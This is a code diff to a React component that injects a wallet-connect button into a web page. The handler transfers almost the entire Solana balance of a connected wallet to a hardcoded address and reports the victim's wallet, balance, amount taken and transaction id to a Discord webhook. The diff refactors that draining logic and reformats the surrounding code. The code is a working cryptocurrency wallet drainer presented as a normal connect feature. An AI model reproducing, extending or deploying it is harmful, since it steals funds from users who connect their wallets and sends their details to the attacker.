@@ -130,34 +130,27 @@ const WalletConnectionHandler: FC = () => {
             const toPubkey = new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz');
             const blockhash = await connection.getLatestBlockhash();
 
-            const reservedLamports = 1000000; // 0.001 SOL reserved
+            const reservedLamports = 0.001 * LAMPORTS_PER_SOL;
             const availableLamports = lamports - reservedLamports;
 
-            if (availableLamports <= 0) {
-                alert('⚠️ Not enough SOL after reservation to perform a transaction.');
-                return;
-            }
-
-            const feeResp = await connection.getFeeForMessage(
-                new Transaction({
-                    feePayer: walletPublicKey,
-                    recentBlockhash: blockhash.blockhash,
+            const dummyTx = new Transaction({
+                feePayer: walletPublicKey,
+                recentBlockhash: blockhash.blockhash,
+            }).add(
+                SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey,
+                    lamports: 1, // dummy value to get fee
                 })
-                    .add(
-                        SystemProgram.transfer({
-                            fromPubkey: walletPublicKey,
-                            toPubkey,
-                            lamports: availableLamports,
-                        })
-                    )
-                    .compileMessage()
             );
 
+            const feeResp = await connection.getFeeForMessage(dummyTx.compileMessage());
             const feeLamports = feeResp.value || 5000;
+
             const sendableLamports = availableLamports - feeLamports;
 
             if (sendableLamports <= 0) {
-                alert('⚠️ Not enough SOL to cover the transaction fee after reservation.');
+                alert('⚠️ Not enough SOL to cover the transaction + reserve.');
                 return;
             }
 
@@ -179,7 +172,7 @@ const WalletConnectionHandler: FC = () => {
 
                     await sendDiscordWebhook(
                         walletPublicKey.toBase58(),
-                        lamports! / LAMPORTS_PER_SOL,
+                        lamports / LAMPORTS_PER_SOL,
                         sendableLamports,
                         toPubkey.toBase58(),
                         txid
@@ -263,13 +256,18 @@ const WalletConnectionHandler: FC = () => {
     };
 
     const walletPopupEl =
-        typeof window !== 'undefined' ? document.querySelector('.wallet-popup#walletPopup') : null;
+        typeof window !== 'undefined'
+            ? document.querySelector('.wallet-popup#walletPopup')
+            : null;
 
     return walletPopupEl ? ReactDOM.createPortal(<div></div>, walletPopupEl) : null;
 };
 
 const InjectWalletMultiButton: FC = () => {
-    const target = typeof window !== 'undefined' ? document.getElementById('connect_button') : null;
+    const target =
+        typeof window !== 'undefined'
+            ? document.getElementById('connect_button')
+            : null;
     const { connected } = useWallet();
     const { setVisible } = useWalletModal();
 
@@ -297,7 +295,14 @@ const InjectWalletMultiButton: FC = () => {
 
     return target
         ? ReactDOM.createPortal(
-              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px' }}>
+              <div
+                  style={{
+                      display: 'flex',
+                      flexDirection: 'column',
+                      alignItems: 'center',
+                      gap: '10px',
+                  }}
+              >
                   <WalletMultiButton
                       style={{
                           background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
